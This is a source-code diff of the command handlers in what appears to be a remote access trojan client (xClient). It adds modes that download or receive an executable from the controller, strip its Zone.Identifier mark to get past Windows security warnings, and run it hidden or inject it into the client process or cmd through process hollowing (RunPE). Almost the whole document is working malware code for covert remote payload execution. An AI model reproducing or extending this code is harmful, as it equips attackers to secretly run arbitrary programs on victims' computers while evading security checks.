@@ -77,60 +77,110 @@ namespace xClient.Core.Commands
         }
 
         public static void HandleDownloadAndExecuteCommand(Packets.ServerPackets.DownloadAndExecute command,
-            Client client)
+                   Client client)
         {
             new Packets.ClientPackets.Status("Downloading file...").Execute(client);
 
             new Thread(() =>
             {
-                string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
-                    Helper.Helper.GetRandomFilename(12, ".exe"));
-
                 try
                 {
-                    using (WebClient c = new WebClient())
+                    if (command.Type == "drop")
                     {
-                        c.Proxy = null;
-                        c.DownloadFile(command.URL, tempFile);
+                        #region drop
+                        string tempFile = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
+                            Helper.Helper.GetRandomFilename(12, ".exe"));
+
+                        try
+                        {
+                            using (WebClient c = new WebClient())
+                            {
+                                c.Proxy = null;
+                                c.DownloadFile(command.URL, tempFile);
+                            }
+                        }
+                        catch
+                        {
+                            new Packets.ClientPackets.Status("Download failed!").Execute(client);
+                            return;
+                        }
+
+                        new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
+
+                        try
+                        {
+                            DeleteFile(tempFile + ":Zone.Identifier");
+
+                            var bytes = File.ReadAllBytes(tempFile);
+                            if (bytes[0] != 'M' && bytes[1] != 'Z')
+                                throw new Exception("Not an .EXE file!");
+
+                            ProcessStartInfo startInfo = new ProcessStartInfo();
+                            if (command.RunHidden)
+                            {
+                                startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                                startInfo.CreateNoWindow = true;
+                            }
+                            startInfo.UseShellExecute = command.RunHidden;
+                            startInfo.FileName = tempFile;
+                            Process.Start(startInfo);
+                        }
+                        catch (Exception ex)
+                        {
+                            DeleteFile(tempFile);
+                            new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
+                            return;
+                        }
+                        #endregion
+                    }
+                    else if (command.Type == "self")
+                    {
+                        byte[] fileBytes = Download(command.URL, client);
+                        if (fileBytes == null)
+                            new Packets.ClientPackets.Status("Download failed!").Execute(client);
+
+                        RunPE.Invoke(new string[] { Convert.ToBase64String(fileBytes), "self", "" }, client);
+                    }
+                    else if (command.Type == "cmd")
+                    {
+                        byte[] fileBytes = Download(command.URL, client);
+                        if (fileBytes == null)
+                            new Packets.ClientPackets.Status("Download failed!").Execute(client);
+
+                        RunPE.Invoke(new string[] { Convert.ToBase64String(fileBytes), "sys", "cmd" }, client);
+                    }
+                    else
+                    {
+                        new Packets.ClientPackets.Status("Unknown Injection Type!").Execute(client);
                     }
                 }
-                catch
+                catch (Exception ex)
                 {
-                    new Packets.ClientPackets.Status("Download failed!").Execute(client);
+                    new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
                     return;
                 }
-
-                new Packets.ClientPackets.Status("Downloaded File!").Execute(client);
-
-                try
-                {
-                    DeleteFile(tempFile + ":Zone.Identifier");
-
-                    var bytes = File.ReadAllBytes(tempFile);
-                    if (bytes[0] != 'M' && bytes[1] != 'Z')
-                        throw new Exception("no pe file");
-
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
-                    if (command.RunHidden)
-                    {
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.CreateNoWindow = true;
-                    }
-                    startInfo.UseShellExecute = command.RunHidden;
-                    startInfo.FileName = tempFile;
-                    Process.Start(startInfo);
-                }
-                catch
-                {
-                    DeleteFile(tempFile);
-                    new Packets.ClientPackets.Status("Execution failed!").Execute(client);
-                    return;
-                }
-
                 new Packets.ClientPackets.Status("Executed File!").Execute(client);
             }).Start();
         }
 
+        private static byte[] Download(string url, Client client)
+        {
+            byte[] fileBytes;
+            try
+            {
+                using (WebClient c = new WebClient())
+                {
+                    c.Proxy = null;
+                    fileBytes = c.DownloadData(url);
+                }
+            }
+            catch
+            {
+                return null;
+            }
+
+            return fileBytes;
+        }
         public static void HandleUploadAndExecute(Packets.ServerPackets.UploadAndExecute command, Client client)
         {
             string filePath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),
@@ -141,7 +191,7 @@ namespace xClient.Core.Commands
                 if (command.CurrentBlock == 0 && command.Block[0] != 'M' && command.Block[1] != 'Z')
                     throw new Exception("No executable file");
 
-                FileSplit destFile = new FileSplit(filePath);
+                MemorySplit destFile = new MemorySplit(filePath);
 
                 if (!destFile.AppendBlock(command.Block, command.CurrentBlock))
                 {
@@ -152,25 +202,68 @@ namespace xClient.Core.Commands
 
                 if ((command.CurrentBlock + 1) == command.MaxBlocks) // execute
                 {
-                    DeleteFile(filePath + ":Zone.Identifier");
-
-                    ProcessStartInfo startInfo = new ProcessStartInfo();
-                    if (command.RunHidden)
+                    if (command.Type == "drop")
                     {
-                        startInfo.WindowStyle = ProcessWindowStyle.Hidden;
-                        startInfo.CreateNoWindow = true;
-                    }
-                    startInfo.UseShellExecute = command.RunHidden;
-                    startInfo.FileName = filePath;
-                    Process.Start(startInfo);
 
-                    new Packets.ClientPackets.Status("Executed File!").Execute(client);
+                        if (!destFile.DropFile())
+                        {
+                            new Packets.ClientPackets.Status(string.Format("Drop failed: {0}", destFile.LastError)).Execute(
+                               client);
+                            return;
+                        }
+
+                        DeleteFile(filePath + ":Zone.Identifier");
+
+                        ProcessStartInfo startInfo = new ProcessStartInfo();
+                        if (command.RunHidden)
+                        {
+                            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
+                            startInfo.CreateNoWindow = true;
+                        }
+                        startInfo.UseShellExecute = command.RunHidden;
+                        startInfo.FileName = filePath;
+                        Process.Start(startInfo);
+
+                        new Packets.ClientPackets.Status("Executed File!").Execute(client);
+                    }
+                    else if (command.Type == "self")
+                    {
+                        byte[] dat = destFile.ToByteArray();
+                        //File.WriteAllBytes("lol.exe", dat);
+                        if (dat == null)
+                        {
+                            new Packets.ClientPackets.Status("Payload was null!").Execute(client);
+                            return;
+                        }
+                        //Assembly a = Assembly.Load(xClient.Properties.Resources.RunPELib);
+                        //a.EntryPoint.Invoke(null, new object[] { new string[] { Convert.ToBase64String(dat), "self", "" } });
+
+                        RunPE.Invoke(new string[] { Convert.ToBase64String(dat), "self", "" }, client);
+                    }
+                    else if (command.Type == "cmd")
+                    {
+                        byte[] dat = destFile.ToByteArray();
+                        if (dat == null)
+                        {
+                            new Packets.ClientPackets.Status("Payload was null!").Execute(client);
+                            return;
+                        }
+                        //Assembly a = Assembly.Load(xClient.Properties.Resources.RunPELib);
+                        //a.EntryPoint.Invoke(null, new object[] { new string[] { Convert.ToBase64String(dat), "sys", "cmd" } });
+                        RunPE.Invoke(new string[] { Convert.ToBase64String(dat), "sys", "cmd" }, client);
+                    }
+                    else
+                    {
+                        new Packets.ClientPackets.Status("Unknown Injection Type!").Execute(client);
+                    }
+
                 }
             }
             catch (Exception ex)
             {
                 DeleteFile(filePath);
-                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.Message)).Execute(client);
+                new Packets.ClientPackets.Status(string.Format("Execution failed: {0}", ex.ToString())).Execute(client);
+                //MessageBox.Show(ex.ToString());
             }
         }
 
